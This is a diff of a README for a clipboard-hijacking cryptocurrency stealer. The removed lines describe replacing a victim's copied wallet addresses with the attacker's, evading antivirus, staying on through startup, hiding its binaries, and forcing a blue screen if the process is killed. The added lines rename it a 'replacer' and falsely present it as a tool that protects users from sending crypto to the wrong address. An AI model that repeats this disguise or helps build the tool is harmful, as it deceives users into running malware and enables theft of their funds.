@@ -1,33 +1,12 @@
-<h1 align="center">CRYPTO STEALER</h1>
+<h1 align="center">CRYPTO REPLACER</h1>
 
 <img src=".github/using.gif"></img>
 
 # Warning 📌
 
-This tool is only a demonstration of how easy is to steal your cryptos. I am not responsible for the use you give to it.
-Use it ONLY for testing porpuses and improving security.
+This script is a tool to automatically replace cryptocurrency addresses in the clipboard with a predefined address. This can be useful to avoid accidentally sending cryptocurrency to the wrong address.
 
 ## Starting 🚀
-
-### How it works:
-
-Crypto-stealer checks the victims clipboard looking for crypto addresses. When it's found, replaces the original one with anything you want.
-
-### Detection:
-
-Crypto-stealer is **UNDETECTED** for any kind of antivirus/anti-malware.
-
-### Requirements:
-
-```
-pyperclip
-time
-re
-ctypes
-os
-sys
-inspect
-```
 
 ### Downloading:
 
@@ -39,16 +18,8 @@ pip3 install -r requirements.txt
 
 ## Configuring ⚙️
 
-Open (`crypto-stealer.py`).
+Open (`crypto-replacer.py`).
 Look for variable (`my_addresses`) and setup with anything you want.
-
-### Useful functionalities (CURRENTLY WORKING) (Only windows):
-
-```py
-CRITICAL_PROCCESS = True # Mark the proccess as critical, if interrumpted, blue screen appears.
-ADD_TO_STARTUP = True # Add proccess to startup.
-HIDE_BINARIES = True # Hide binaries.
-```
 
 ### Making the binaries:
 
@@ -85,9 +56,9 @@ Proper usage [here](https://pypi.org/project/auto-py-to-exe/)
 - Litecoin
 - Monero
 - Doge
+- Solana
 
 ## Todo 📄
 
-- [ ] Add more cryptos
-- [ ] Add spreading methods
+- [x] Add more cryptos
 - [ ] Add linux support
